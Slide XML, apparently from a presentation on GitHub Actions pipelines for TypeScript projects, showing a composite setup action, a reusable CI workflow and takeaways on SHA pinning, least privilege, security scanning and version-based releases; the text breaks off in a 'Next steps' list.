          <p:cNvPr id="7" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2331720"/>
            <a:ext cx="5394960" cy="251460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400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>.github/actions/setup-ts/action.yml</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runs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using</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: composite</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steps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uses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: pnpm/action-setup@ea17c68d…  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># v6.1.0</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uses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: actions/setup-node@949feb24…  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># v7.1.0</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with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: { node-version: 24, cache: pnpm }</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: pnpm install --frozen-lockfile</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shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: bash</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="1554480"/>
            <a:ext cx="566928" cy="566928"/>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9" name="Icon 9" descr="Workflow"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6381415" y="1690543"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6976872" y="1517904"/>
            <a:ext cx="4663440" cy="64008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800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reusable workflow</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Shares jobs: deploy runs the real CI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="2331720"/>
            <a:ext cx="5394960" cy="2514600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2230"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="182880" tIns="137160" rIns="137160" bIns="109728" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ts-ci.yml + ts-deploy.yml</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># ts-ci.yml</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on</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pull_request</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workflow_call</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>:      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># make it callable</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endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># ts-deploy.yml</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>jobs</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ci</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>uses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: $/.github/workflows/ts-ci.yml</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Self repo note"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5120640"/>
            <a:ext cx="11091672" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F4F4F6"/>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3" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5120640"/>
            <a:ext cx="10698480" cy="54864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300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6E3CBE"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>$/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>self-repository syntax: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>resolves to this repo at the running commit, no checkout needed. GitHub Enterprise Server: use ./</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="130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47472"/>
            <a:ext cx="11064240" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="b">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Takeaways and next steps</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Subtitle"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="969264"/>
            <a:ext cx="11064240" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="18288" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Everything shown is in github-actions-demo, ready to copy into your project</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1554480"/>
            <a:ext cx="566928" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A9BCD"/>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5" name="Icon 5" descr="ListChecks"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="684703" y="1690543"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="1517904"/>
            <a:ext cx="5120640" cy="914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600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fail fast, in parallel</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Six gates per project, a build only when all pass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2606040"/>
            <a:ext cx="566928" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="26AF72"/>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8" name="Icon 8" descr="ShieldCheck"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="684703" y="2742103"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="2569464"/>
            <a:ext cx="5120640" cy="914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600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Secure the pipeline too</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Least privilege, SHA pins</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, zizmor + CodeQL on every push</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3657600"/>
            <a:ext cx="566928" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F5B400"/>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1" name="Icon 11" descr="Scale"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="684703" y="3793663"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="3621024"/>
            <a:ext cx="5120640" cy="914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600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Compliance as code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>One policy file, a CSV for reviewers, a red build for violations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4709160"/>
            <a:ext cx="566928" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6E3CBE"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Icon 14" descr="Rocket"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="684703" y="4845223"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="4672584"/>
            <a:ext cx="5120640" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Deploy by version</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Bump the version and a GitHub Release is created automatically</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Next steps"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6812280" y="1554480"/>
            <a:ext cx="4828032" cy="4160520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="282828"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="109728" tIns="73152" rIns="109728" bIns="73152" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="1828800"/>
            <a:ext cx="4297680" cy="3794760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Next steps</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F5B400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Protect main: require the CI, Security and OSS checks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F5B400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
